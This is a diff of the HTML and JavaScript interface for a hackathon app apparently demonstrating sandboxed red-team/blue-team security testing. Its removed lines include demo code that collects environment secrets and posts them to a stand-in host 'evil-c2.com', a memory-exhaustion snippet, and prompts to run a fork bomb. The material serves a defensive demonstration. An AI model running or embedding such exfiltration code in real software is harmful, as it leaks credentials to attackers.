-              <div class="rounded border border-slate-800 bg-[#070b14] p-3 overflow-x-auto max-h-56 font-mono text-xs text-rose-300">
-                <pre id="red-code-block" class="whitespace-pre"># Red Exploit: Sneak env exfiltration via urllib
-import os, urllib.request
-
-env_dump = dict(os.environ)
-req = urllib.request.Request("http://evil-c2.com/leak", data=str(env_dump).encode())
-urllib.request.urlopen(req) # Air-gap traps socket creation!</pre>
-              </div>
-              <div class="text-[11px] font-mono text-slate-400 flex items-center justify-between pt-1">
-                <span>Model: <span class="text-slate-300">kimi-k2-instruct</span></span>
-                <span id="red-tokens-badge">Tokens: 342</span>
-              </div>
-            </div>
-
-            <!-- Blue Team (Maker Hotpatch) Card -->
-            <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 space-y-3">
-              <div class="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
-                <div class="flex items-center gap-2">
-                  <span class="w-2.5 h-2.5 rounded-full bg-emerald-400"></span>
-                  <span class="text-xs font-mono font-bold text-white">BLUE AGENT: DEFENDER</span>
-                </div>
-                <span id="blue-badge" class="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-950/60 text-emerald-300 border border-emerald-800/50">
-                  IMMUNITY VERIFIED
-                </span>
-              </div>
-              <p class="text-xs text-slate-300" id="blue-explanation">
-                Generated vault-sanitized masking patch. Strips secret credentials and enforces local-only routing invariant.
-              </p>
-              <div class="rounded border border-slate-800 bg-[#070b14] p-3 overflow-x-auto max-h-56 font-mono text-xs text-emerald-300">
-                <pre id="blue-code-block" class="whitespace-pre"># Blue Patch: Safe Environment Masking
-import os
-
-class SecureVault:
-    def get_public_config(self):
-        # Scrub secret keys from environment exports
-        return {k: v for k, v in os.environ.items() if not k.startswith("SECRET_")}</pre>
-              </div>
-              <div class="text-[11px] font-mono text-slate-400 flex items-center justify-between pt-1">
-                <span>Verification: <span class="text-emerald-400">Retaliation Passed</span></span>
-                <span id="blue-tokens-badge">Tokens: 418</span>
-              </div>
-            </div>
-
-          </div>
-        </div>
-
-        <!-- TAB CONTENT 2: CRYPTOGRAPHIC PROOF -->
-        <div id="tab-content-proof" class="p-5 space-y-4 hidden">
-          <div class="max-w-3xl space-y-3">
-            <h4 class="text-sm font-semibold text-white">Cryptographically Signed Execution Receipt</h4>
-            <p class="text-xs text-slate-300 leading-relaxed">
-              Every execution in AegisSentinel produces a non-repudiable receipt signed by the enclave's Ed25519 private key.
-              Judges and external auditors can independently verify that the code was executed inside the designated sandbox.
+            <h1 class="text-2xl sm:text-3xl font-bold tracking-tight text-white">AegisSentinel SecOps Copilot</h1>
+            <p class="text-sm text-slate-400 mt-2 max-w-lg mx-auto">
+              Autonomous dual-agent Maker-Breaker arena providing an instant 1-Click Containment Moment. Ask to audit microservices, detonate adversarial exploits, or synthesize cryptographic zero-trust patches.
             </p>
           </div>
 
-          <div class="rounded-lg border border-slate-800 bg-slate-950/70 p-4 space-y-3 text-xs font-mono">
-            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-              <div>
-                <span class="text-slate-500 block text-[11px]">RECEIPT ID</span>
-                <span class="text-white font-semibold" id="rcpt-id">rcpt-verified-init</span>
+          <!-- Prompt Suggestions Grid -->
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-left pt-2 max-w-2xl mx-auto">
+            <button onclick="sendPresetPrompt('Audit payment gateway microservice for credentials exfiltration and outbound leaks')"
+                    class="glass-card p-3.5 rounded-xl hover:border-cyan-500/60 transition group">
+              <div class="text-xs font-semibold text-slate-200 group-hover:text-cyan-400 transition flex items-center gap-2">
+                <i class="fa-solid fa-shield-halved text-cyan-400"></i>
+                Audit Payment Gateway
               </div>
-              <div>
-                <span class="text-slate-500 block text-[11px]">STATUS</span>
-                <span class="text-emerald-400 font-semibold" id="rcpt-status">MATHEMATICALLY_VERIFIED</span>
-              </div>
-              <div>
-                <span class="text-slate-500 block text-[11px]">RUNTIME ENGINE</span>
-                <span class="text-slate-300 font-semibold">{{ RUNTIME_ENGINE }}</span>
-              </div>
-              <div>
-                <span class="text-slate-500 block text-[11px]">EXIT CODE</span>
-                <span class="text-slate-300 font-semibold" id="rcpt-exit">0 (SUCCESS)</span>
-              </div>
-            </div>
-
-            <div class="pt-2 border-t border-slate-800 space-y-2">
-              <div>
-                <span class="text-slate-500 block text-[11px]">ED25519 NOTARY SIGNATURE</span>
-                <div class="mt-1 flex items-center justify-between p-2 rounded bg-slate-900 border border-slate-800 overflow-x-auto">
-                  <span class="text-sky-300 text-[11px] truncate" id="rcpt-sig">{{ PUBLIC_KEY }}</span>
-                  <button onclick="copySignature()" class="ml-2 px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] shrink-0">
-                    <i class="fa-regular fa-copy"></i> Copy
-                  </button>
-                </div>
-              </div>
-
-              <div>
-                <span class="text-slate-500 block text-[11px]">TAMPER-PROOF CHAIN HASH</span>
-                <div class="mt-1 p-2 rounded bg-slate-900 border border-slate-800 text-amber-300 text-[11px] truncate">
-                  {{ LATEST_HASH }}
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Proof Actions -->
-          <div class="flex items-center gap-3 pt-2">
-            <button onclick="verifyReceiptOnline()" class="px-4 py-2 rounded-lg bg-sky-600 hover:bg-sky-500 text-white font-mono text-xs font-semibold transition flex items-center gap-2">
-              <i class="fa-solid fa-fingerprint"></i>
-              <span>Verify Signature Online</span>
+              <p class="text-[11px] text-slate-400 mt-1">Intercept supply-chain credential sniffing & verify air-gap.</p>
             </button>
-            <button onclick="downloadReceiptJSON()" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 font-mono text-xs transition flex items-center gap-2">
-              <i class="fa-solid fa-download"></i>
-              <span>Download Receipt JSON</span>
+
+            <button onclick="sendPresetPrompt('Detonate recursive fork bomb memory allocator inside container')"
+                    class="glass-card p-3.5 rounded-xl hover:border-cyan-500/60 transition group">
+              <div class="text-xs font-semibold text-slate-200 group-hover:text-amber-400 transition flex items-center gap-2">
+                <i class="fa-solid fa-fire-flame-curved text-amber-400"></i>
+                Detonate Fork Bomb
+              </div>
+              <p class="text-[11px] text-slate-400 mt-1">Verify cgroups memory hard-ceiling (256MB) & SIGKILL interception.</p>
+            </button>
+
+            <button onclick="sendPresetPrompt('Test transaction ledger settlement engine for decimal precision drift')"
+                    class="glass-card p-3.5 rounded-xl hover:border-cyan-500/60 transition group">
+              <div class="text-xs font-semibold text-slate-200 group-hover:text-sky-400 transition flex items-center gap-2">
+                <i class="fa-solid fa-coins text-sky-400"></i>
+                Test Financial Precision
+              </div>
+              <p class="text-[11px] text-slate-400 mt-1">Detect IEEE 754 drift and synthesize fixed-point mathematical invariants.</p>
+            </button>
+
+            <button onclick="openCustomCodeModal()"
+                    class="glass-card p-3.5 rounded-xl hover:border-cyan-500/60 transition group">
+              <div class="text-xs font-semibold text-slate-200 group-hover:text-emerald-400 transition flex items-center gap-2">
+                <i class="fa-solid fa-code text-emerald-400"></i>
+                Audit Custom Microservice
+              </div>
+              <p class="text-[11px] text-slate-400 mt-1">Paste your Python code to trigger automated Red/Blue dual execution.</p>
             </button>
           </div>
         </div>
 
-        <!-- TAB CONTENT 3: LIVE TERMINAL LOG -->
-        <div id="tab-content-terminal" class="p-5 space-y-3 hidden">
-          <div class="flex items-center justify-between">
-            <div class="flex items-center gap-2">
-              <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
-              <span class="text-xs font-mono font-bold text-slate-300">CONTAINER STDOUT / SSE TELEMETRY</span>
-            </div>
-            <div class="flex items-center gap-2">
-              <button onclick="copyTerminal()" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition">
-                <i class="fa-regular fa-copy"></i> Copy
-              </button>
-              <button onclick="clearTerminal()" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition">
-                <i class="fa-solid fa-trash-can"></i> Clear
-              </button>
-            </div>
-          </div>
-
-          <div id="terminal-window" class="rounded-lg border border-slate-800 bg-[#060a12] p-4 font-mono text-xs h-72 overflow-y-auto space-y-1 text-slate-300">
-            <div class="text-slate-500">[INIT] AegisSentinel Telemetry Stream initialized.</div>
-            <div class="text-slate-500">[INFO] Sandbox runtime: {{ RUNTIME_ENGINE }} | Isolation: STRICT</div>
-            <div class="text-slate-500">[INFO] Public Key: {{ PUBLIC_KEY }}</div>
-            <div class="text-sky-400">[SYSTEM] Awaiting mission dispatch...</div>
-          </div>
-        </div>
-
-        <!-- TAB CONTENT 4: AUDIT LEDGER -->
-        <div id="tab-content-audit" class="p-5 space-y-4 hidden">
-          <div class="flex items-center justify-between">
-            <div>
-              <h4 class="text-sm font-semibold text-white">Tamper-Proof Audit Chain</h4>
-              <p class="text-xs text-slate-400">Chronological hash-linked ledger of all container events and verification outcomes.</p>
-            </div>
-            <button onclick="refreshAuditEvents()" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition flex items-center gap-1.5">
-              <i class="fa-solid fa-rotate"></i>
-              <span>Refresh</span>
-            </button>
-          </div>
-
-          <div class="rounded-lg border border-slate-800 overflow-x-auto">
-            <table class="w-full text-left text-xs font-mono">
-              <thead class="bg-slate-900/80 text-slate-400 border-b border-slate-800">
-                <tr>
-                  <th class="py-2.5 px-3">EVENT ID</th>
-                  <th class="py-2.5 px-3">TYPE</th>
-                  <th class="py-2.5 px-3">TASK</th>
-                  <th class="py-2.5 px-3">PREV HASH</th>
-                  <th class="py-2.5 px-3">EVENT HASH</th>
-                </tr>
-              </thead>
-              <tbody id="audit-table-body" class="divide-y divide-slate-800 text-slate-300">
-                <tr>
-                  <td class="py-2.5 px-3 text-sky-400 font-semibold">evt-init-01</td>
-                  <td class="py-2.5 px-3"><span class="px-1.5 py-0.5 rounded bg-slate-800 text-slate-300">SYSTEM_GENESIS</span></td>
-                  <td class="py-2.5 px-3">genesis-init</td>
-                  <td class="py-2.5 px-3 text-slate-500">0000000000000000...</td>
-                  <td class="py-2.5 px-3 text-amber-300 font-semibold">{{ LATEST_HASH }}</td>
-                </tr>
-              </tbody>
-            </table>
-          </div>
-        </div>
-
-        <!-- TAB CONTENT 5: MULTIMODAL TOOLS -->
-        <div id="tab-content-multimodal" class="p-5 space-y-5 hidden">
-          <div class="max-w-2xl">
-            <h4 class="text-sm font-semibold text-white">Vultr Multimodal AI Auxiliary Suite</h4>
-            <p class="text-xs text-slate-300">Integrated voice synthesis (Qwen-TTS), speech-to-text (Whisper), and topology generation (Z-Image-Turbo).</p>
-          </div>
-
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-
-            <!-- Tool 1: Voice Alert -->
-            <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 space-y-3">
-              <div class="flex items-center gap-2">
-                <i class="fa-solid fa-volume-high text-sky-400"></i>
-                <span class="text-xs font-mono font-bold text-white">Voice Alarm Synthesis</span>
-              </div>
-              <p class="text-xs text-slate-400">Synthesize auditory security alerts with <code class="text-slate-300">qwen3-tts-12hz-1.7b</code>.</p>
-              <button onclick="playVoiceAlert()" class="w-full px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-mono text-xs transition flex items-center justify-center gap-2">
-                <i class="fa-solid fa-play"></i>
-                <span>Synthesize & Play Voice Alert</span>
-              </button>
-            </div>
-
-            <!-- Tool 2: Threat Topology -->
-            <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 space-y-3">
-              <div class="flex items-center gap-2">
-                <i class="fa-solid fa-diagram-project text-sky-400"></i>
-                <span class="text-xs font-mono font-bold text-white">Attack Surface Topology</span>
-              </div>
-              <p class="text-xs text-slate-400">Synthesize visual diagram with <code class="text-slate-300">z-image-turbo</code>.</p>
-              <button onclick="renderThreatDiagram()" class="w-full px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-mono text-xs transition flex items-center justify-center gap-2">
-                <i class="fa-solid fa-image"></i>
-                <span>Render Attack Surface Diagram</span>
-              </button>
-            </div>
-
-          </div>
-
-          <div id="diagram-container" class="hidden rounded-lg border border-slate-800 bg-slate-950 p-3 text-center">
-            <img id="diagram-img" src="" alt="Threat Diagram" class="max-h-72 mx-auto rounded border border-slate-800" />
-          </div>
-        </div>
+        <!-- Dynamic Message Stream (Injected by JS) -->
+        <div id="chat-messages-stream" class="max-w-3xl mx-auto space-y-6"></div>
 
       </div>
 
-    </div>
 
-  </main>
+      <!-- BOTTOM PROMPT BAR (CHATGPT-STYLE) -->
+      <div class="p-4 sm:p-5 border-t border-slate-800/80 bg-midnight-900/90 backdrop-blur-md shrink-0">
+        <div class="max-w-3xl mx-auto space-y-2.5">
 
-  <!-- FOOTER -->
-  <footer class="border-t border-slate-800/80 bg-[#070b14] py-4 text-xs font-mono text-slate-500">
-    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-2">
-      <div>AegisSentinel &bull; Vultr Agent Rush Hackathon 2026 &bull; Yield-Guardian Architecture</div>
-      <div class="flex items-center space-x-3">
-        <span>Cloudflare Zero-Trust Tunnel</span>
-        <span>&bull;</span>
-        <a href="/health" class="hover:text-slate-300 transition">/health API</a>
+          <!-- Quick Prompt Chips Row -->
+          <div class="flex items-center gap-2 overflow-x-auto pb-1 text-xs font-mono">
+            <span class="text-slate-500 text-[11px] shrink-0">Prompts:</span>
+            <button onclick="sendPresetPrompt('Audit Payment Gateway for secret exfiltration')"
+                    class="px-2.5 py-1 rounded-full bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700/60 shrink-0 transition">
+              🛡️ Payment Gateway
+            </button>
+            <button onclick="sendPresetPrompt('Detonate recursive fork bomb to test cgroups ceiling')"
+                    class="px-2.5 py-1 rounded-full bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700/60 shrink-0 transition">
+              💥 Fork Bomb
+            </button>
+            <button onclick="sendPresetPrompt('Test settlement engine for decimal precision drift')"
+                    class="px-2.5 py-1 rounded-full bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700/60 shrink-0 transition">
+              ⚖️ Precision Drift
+            </button>
+            <button onclick="runChaosTest()"
+                    class="px-2.5 py-1 rounded-full bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 shrink-0 transition">
+              ⚡ 1-Click Chaos
+            </button>
+          </div>
+
+          <!-- Input Bar Surface -->
+          <div class="glass-panel rounded-2xl p-2 sm:p-2.5 flex items-end gap-2 focus-within:border-cyan-500/60 transition shadow-lg shadow-black/40">
+            <!-- Code Attachment Button -->
+            <button onclick="openCustomCodeModal()" title="Attach Custom Microservice Code"
+                    id="btn-code-attach"
+                    class="p-2.5 rounded-xl text-slate-400 hover:text-cyan-400 hover:bg-slate-800/60 transition shrink-0">
+              <i class="fa-solid fa-code text-sm"></i>
+            </button>
+
+            <!-- Voice Dictation Button (Whisper) -->
+            <button onclick="toggleVoiceRecording()" title="Spoken Voice Command"
+                    id="btn-voice-dictate"
+                    class="p-2.5 rounded-xl text-slate-400 hover:text-amber-400 hover:bg-slate-800/60 transition shrink-0">
+              <i class="fa-solid fa-microphone text-sm"></i>
+            </button>
+
+            <!-- Textarea -->
+            <textarea id="copilot-input"
+                      rows="1"
+                      placeholder="Ask AegisSentinel to audit a service, simulate a breach, or paste code..."
+                      class="flex-1 bg-transparent border-0 text-sm text-white placeholder-slate-500 focus:ring-0 resize-none py-2 px-1 max-h-36 leading-relaxed"
+                      onkeydown="handleInputKeyDown(event)"></textarea>
+
+            <!-- Send Button -->
+            <button onclick="submitCopilotMessage()" id="btn-submit-message"
+                    class="p-2.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold transition shrink-0 shadow-md shadow-cyan-600/30 disabled:opacity-50 disabled:cursor-not-allowed">
+              <i class="fa-solid fa-arrow-up text-sm"></i>
+            </button>
+          </div>
+
+          <!-- Bottom Privacy & Safety Caption -->
+          <div class="text-[11px] font-mono text-center text-slate-400">
+            Air-Gapped Quarantine Enclave &bull; Vultr Agent Rush 2026 &bull; Vultr Cloud Compute VX1 &bull; 0 Secrets Leaked
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+  </div>
+
+
+  <!-- ================= COLLAPSIBLE BOTTOM TERMINAL DRAWER ================= -->
+  <div id="terminal-drawer"
+       class="border-t border-slate-800 bg-midnight-950 fixed inset-x-0 bottom-0 z-40 transform translate-y-full transition-transform duration-300 ease-in-out shadow-2xl">
+    <!-- Drawer Header -->
+    <div class="h-10 px-4 bg-midnight-900 border-b border-slate-800 flex items-center justify-between text-xs font-mono text-slate-400">
+      <div class="flex items-center gap-2">
+        <i class="fa-solid fa-terminal text-cyan-400"></i>
+        <span class="text-slate-200 font-semibold">Live Sandbox Execution Stream</span>
+        <span class="text-[10px] text-slate-400">(gVisor runsc kernel events)</span>
+      </div>
+      <div class="flex items-center gap-2">
+        <button onclick="copyTerminalOutput()" class="hover:text-white px-2 py-1 rounded hover:bg-slate-800 transition">Copy</button>
+        <button onclick="clearTerminalOutput()" class="hover:text-white px-2 py-1 rounded hover:bg-slate-800 transition">Clear</button>
+        <button onclick="toggleTerminalDrawer()" class="hover:text-white p-1 rounded hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
       </div>
     </div>
-  </footer>
+    <!-- Drawer Console Output -->
+    <div id="terminal-stream-console" class="p-4 h-64 overflow-y-auto font-mono text-xs text-slate-300 space-y-1 bg-black/60">
+      <div class="text-slate-400">[SYSTEM_READY] AegisSentinel containment sandbox active. Network air-gap enforced.</div>
+    </div>
+  </div>
 
-  <!-- JAVASCRIPT CONTROLLER -->
+
+  <!-- ================= ATTACH CUSTOM CODE MODAL ================= -->
+  <div id="custom-code-modal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="glass-panel w-full max-w-2xl rounded-2xl overflow-hidden border border-slate-700 shadow-2xl flex flex-col max-h-[90vh]">
+      <div class="p-4 border-b border-slate-800 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-code text-cyan-400"></i>
+          <span class="text-sm font-semibold text-white">Attach Untrusted Microservice Code</span>
+        </div>
+        <button onclick="closeCustomCodeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div class="p-4 space-y-3 flex-1 overflow-y-auto">
+        <p class="text-xs text-slate-400">Paste arbitrary Python source code to detonate inside the air-gapped gVisor sandbox:</p>
+        <textarea id="modal-code-input" rows="10"
+                  class="w-full rounded-xl bg-slate-950 border border-slate-800 p-3 font-mono text-xs text-cyan-300 focus:border-cyan-500 focus:ring-0"
+                  placeholder="# Untrusted target code&#10;import os&#10;def handler():&#10;    return {'status': 'active'}"></textarea>
+      </div>
+      <div class="p-4 border-t border-slate-800 flex items-center justify-end gap-2 bg-slate-900/40">
+        <button onclick="closeCustomCodeModal()" class="px-3.5 py-2 rounded-lg text-xs font-mono text-slate-400 hover:text-white">Cancel</button>
+        <button onclick="attachCodeSnippet()" class="px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs font-mono transition">
+          Attach to Copilot Prompt
+        </button>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ================= JAVASCRIPT COPILOT CONTROLLER ================= -->
   <script>
-    // State management
-    let currentScenario = 'SUPPLY_CHAIN_LEAK';
-    let isExecuting = false;
-    let timerInterval = null;
-    let executionStartTime = null;
+    let attachedCodeSnippet = null;
+    let isProcessing = false;
+    let isRecordingVoice = false;
+    let mediaRecorder = null;
+    let audioChunks = [];
 
-    const SCENARIOS = {
-      'SUPPLY_CHAIN_LEAK': {
-        name: 'Supply-Chain Exfiltration',
-        vector: 'Vector Alpha',
-        filename: 'packages/analytics_tracker.py',
-        code: `# Untrusted Target Code: Vector Alpha (Supply Chain Backdoor)
-import os, urllib.request
-
-def handler():
-    # Attempt credential harvesting
-    env_keys = {k: v for k, v in os.environ.items() if "KEY" in k or "SECRET" in k}
-    # Attempt outbound exfiltration over HTTP
-    req = urllib.request.Request("http://evil-c2.com/exfiltrate", data=str(env_keys).encode())
-    urllib.request.urlopen(req, timeout=2) # Trapped by sandbox air-gap!
-    return {"status": "dispatched"}`
-      },
-      'FORK_MEMORY_EXHAUSTION': {
-        name: 'Memory & Fork Exhaustion',
-        vector: 'Vector Beta',
-        filename: 'workers/memory_allocator.py',
-        code: `# Untrusted Target Code: Vector Beta (Resource Exhaustion DoS)
-import sys
-
-def allocate_recursively():
-    buffer = []
-    # Attempt allocating 400MB RAM inside 256MB container
-    for i in range(100):
-        buffer.append(b"A" * (1024 * 1024 * 20)) # 20MB per chunk
-    return len(buffer)`
-      },
-      'FINANCIAL_INVARIANT_BUG': {
-        name: 'Financial Invariant Drift',
-        vector: 'Vector Gamma',
-        filename: 'ledger/transaction_processor.py',
-        code: `# Untrusted Target Code: Vector Gamma (Precision Drift Flaw)
-def settle_balance(balance, rate, cycles):
-    # Floating point arithmetic drift
-    for _ in range(cycles):
-        balance += rate * 0.0000001
-    assert balance == 1000.01 # Fails due to IEEE 754 float drift!
-    return balance`
-      }
-    };
-
-    // Clock
-    function updateClock() {
-      const now = new Date();
-      const el = document.getElementById('utc-clock');
-      if (el) el.innerText = now.toISOString().substring(11, 19) + ' UTC';
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
-    // Select Scenario
-    function selectScenario(key) {
-      currentScenario = key;
-      const scen = SCENARIOS[key];
-      if (!scen) return;
-
-      // Update button styling
-      document.querySelectorAll('.scenario-btn').forEach(btn => {
-        btn.classList.remove('border-sky-500/40', 'bg-sky-500/5');
-        btn.classList.add('border-slate-800', 'bg-slate-900/60');
+    // Auto-resize textarea
+    const inputEl = document.getElementById('copilot-input');
+    if (inputEl) {
+      inputEl.addEventListener('input', function() {
+        this.style.height = 'auto';
+        this.style.height = (this.scrollHeight) + 'px';
       });
-
-      const activeBtn = document.getElementById(`btn-scenario-${key}`);
-      if (activeBtn) {
-        activeBtn.classList.remove('border-slate-800', 'bg-slate-900/60');
-        activeBtn.classList.add('border-sky-500/40', 'bg-sky-500/5');
-      }
-
-      // Update Code Preview
-      document.getElementById('editor-filename').innerText = scen.filename;
-      document.getElementById('scenario-code-preview').innerText = scen.code;
-      document.getElementById('editor-line-count').innerText = `${scen.code.split('\n').length} lines`;
-      logToTerminal(`[TARGET_SELECT] Switched target to: ${scen.name} (${scen.vector})`);
     }
 
-    // Terminal Logging
-    function logToTerminal(msg, colorClass = 'text-slate-300') {
-      const term = document.getElementById('terminal-window');
-      if (!term) return;
-      const now = new Date().toISOString().substring(11, 19);
+    function handleInputKeyDown(e) {
+      if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        submitCopilotMessage();
+      }
+    }
+
+    // Toggle Sidebar
+    function toggleSidebar() {
+      const sidebar = document.getElementById('copilot-sidebar');
+      const backdrop = document.getElementById('sidebar-backdrop');
+      if (sidebar.classList.contains('-translate-x-full')) {
+        sidebar.classList.remove('-translate-x-full');
+        backdrop.classList.remove('hidden');
+      } else {
+        sidebar.classList.add('-translate-x-full');
+        backdrop.classList.add('hidden');
+      }
+    }
+
+    // Toggle Terminal Drawer
+    function toggleTerminalDrawer() {
+      const drawer = document.getElementById('terminal-drawer');
+      if (drawer.classList.contains('translate-y-full')) {
+        drawer.classList.remove('translate-y-full');
+      } else {
+        drawer.classList.add('translate-y-full');
+      }
+    }
+
+    function logTerminal(msg, color = 'text-slate-300') {
+      const consoleEl = document.getElementById('terminal-stream-console');
+      if (!consoleEl) return;
+      const ts = new Date().toISOString().substring(11, 19);
       const row = document.createElement('div');
-      row.className = colorClass;
-      row.innerText = `[${now}] ${msg}`;
-      term.appendChild(row);
-      term.scrollTop = term.scrollHeight;
+      row.className = color;
+      row.innerText = `[${ts}] ${msg}`;
+      consoleEl.appendChild(row);
+      consoleEl.scrollTop = consoleEl.scrollHeight;
     }
 
-    function clearTerminal() {
-      const term = document.getElementById('terminal-window');
-      if (term) term.innerHTML = '<div class="text-slate-500">[TERMINAL_CLEARED] Ready.</div>';
+    function clearTerminalOutput() {
+      document.getElementById('terminal-stream-console').innerHTML =
+        '<div class="text-slate-400">[TERMINAL_CLEARED] Ready.</div>';
     }
 
-    function copyTerminal() {
-      const term = document.getElementById('terminal-window');
-      if (term) {
-        navigator.clipboard.writeText(term.innerText);
-        alert('Terminal log copied to clipboard.');
+    function copyTerminalOutput() {
+      const text = document.getElementById('terminal-stream-console').innerText;
+      navigator.clipboard.writeText(text);
+      alert('Terminal output copied to clipboard.');
+    }
+
+    // Custom Code Modal
+    function openCustomCodeModal() {
+      document.getElementById('custom-code-modal').classList.remove('hidden');
+    }
+    function closeCustomCodeModal() {
+      document.getElementById('custom-code-modal').classList.add('hidden');
+    }
+    function attachCodeSnippet() {
+      const code = document.getElementById('modal-code-input').value.trim();
+      if (code) {
+        attachedCodeSnippet = code;
+        document.getElementById('btn-code-attach').classList.add('text-cyan-400', 'bg-cyan-500/10');
+        document.getElementById('copilot-input').placeholder = 'Code attached. Enter instructions (e.g. "Audit this code for vulnerabilities")...';
+      }
+      closeCustomCodeModal();
+    }
+
+    // Preset Prompts
+    function sendPresetPrompt(promptText) {
+      document.getElementById('copilot-input').value = promptText;
+      submitCopilotMessage();
+    }
+
+    // Voice Dictation (Whisper)
+    async function toggleVoiceRecording() {
+      const btn = document.getElementById('btn-voice-dictate');
+      if (!isRecordingVoice) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          mediaRecorder = new MediaRecorder(stream);
+          audioChunks = [];
+          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+          mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+            const formData = new FormData();
+            formData.append('file', audioBlob, 'voice.wav');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin text-sm"></i>';
+            try {
+              const res = await fetch('/api/voice-command', { method: 'POST', body: formData });
+              const data = await res.json();
+              if (data.transcribed_text) {
+                document.getElementById('copilot-input').value = data.transcribed_text;
+              }
+            } catch (err) {
+              logTerminal(`[VOICE_ERROR] ${err}`, 'text-rose-400');
+            } finally {
+              btn.innerHTML = '<i class="fa-solid fa-microphone text-sm"></i>';
+            }
+          };
+          mediaRecorder.start();
+          isRecordingVoice = true;
+          btn.classList.add('text-rose-500', 'bg-rose-500/20', 'animate-pulse');
+        } catch (err) {
+          alert('Microphone access denied or unavailable: ' + err);
+        }
+      } else {
+        if (mediaRecorder) mediaRecorder.stop();
+        isRecordingVoice = false;
+        btn.classList.remove('text-rose-500', 'bg-rose-500/20', 'animate-pulse');
       }
     }
 
-    function copySignature() {
-      const sig = document.getElementById('rcpt-sig').innerText;
-      navigator.clipboard.writeText(sig);
-      alert('Ed25519 signature copied.');
+    // Clear Chat
+    function clearChatThread() {
+      document.getElementById('chat-messages-stream').innerHTML = '';
+      document.getElementById('welcome-hero-card').classList.remove('hidden');
     }
 
-    // Switch Tabs
-    function switchTab(tabId) {
-      document.querySelectorAll('.nav-tab').forEach(b => b.classList.remove('active'));
-      const activeBtn = document.getElementById(`tab-btn-${tabId}`);
-      if (activeBtn) activeBtn.classList.add('active');
-
-      const tabs = ['duel', 'proof', 'terminal', 'audit', 'multimodal'];
-      tabs.forEach(t => {
-        const pane = document.getElementById(`tab-content-${t}`);
-        if (pane) {
-          if (t === tabId) pane.classList.remove('hidden');
-          else pane.classList.add('hidden');
-        }
-      });
+    function startNewSession() {
+      clearChatThread();
+      attachedCodeSnippet = null;
+      document.getElementById('btn-code-attach').classList.remove('text-cyan-400', 'bg-cyan-500/10');
+      document.getElementById('copilot-input').placeholder = 'Ask AegisSentinel to audit a service, simulate a breach, or paste code...';
     }
 
-    // Execute Duel
-    async function executeSelectedDuel() {
-      if (isExecuting) return;
-      isExecuting = true;
+    // Main Message Submission
+    async function submitCopilotMessage() {
+      const input = document.getElementById('copilot-input');
+      const message = input.value.trim();
+      if (!message || isProcessing) return;
 
-      const scen = SCENARIOS[currentScenario];
-      const stepper = document.getElementById('execution-stepper-panel');
-      const primaryBtn = document.getElementById('btn-primary-duel');
-      const primaryBtnText = document.getElementById('primary-btn-text');
+      isProcessing = true;
+      document.getElementById('btn-submit-message').disabled = true;
+      document.getElementById('welcome-hero-card').classList.add('hidden');
 
-      stepper.classList.remove('hidden');
-      primaryBtn.disabled = true;
-      primaryBtnText.innerText = 'Containment Duel in Progress...';
+      // Append User Bubble
+      appendUserMessage(message, attachedCodeSnippet);
+      input.value = '';
+      input.style.height = 'auto';
 
-      executionStartTime = Date.now();
-      timerInterval = setInterval(() => {
-        const elapsed = ((Date.now() - executionStartTime) / 1000).toFixed(1);
-        document.getElementById('pipeline-elapsed-time').innerText = `Elapsed: ${elapsed}s`;
-      }, 100);
+      // Append Copilot Placeholder with Stepper
+      const responseCardId = 'reply-' + Math.random().toString(36).substring(2, 9);
+      appendCopilotLoadingCard(responseCardId);
 
-      logToTerminal(`[DUEL_ENGAGED] Launching Maker-Breaker containment for ${scen.name}...`, 'text-sky-400');
-
-      // Stage 1: AST Check
-      setStepActive(1);
+      logTerminal(`[COPILOT_QUERY] Operator Directive: "${message}"`, 'text-cyan-400');
 
       try {
-        const res = await fetch('/api/duel', {
+        const payload = {
+          message: message,
+          code_snippet: attachedCodeSnippet,
+          session_id: 'session-' + Date.now()
+        };
+
+        const res = await fetch('/api/chat', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
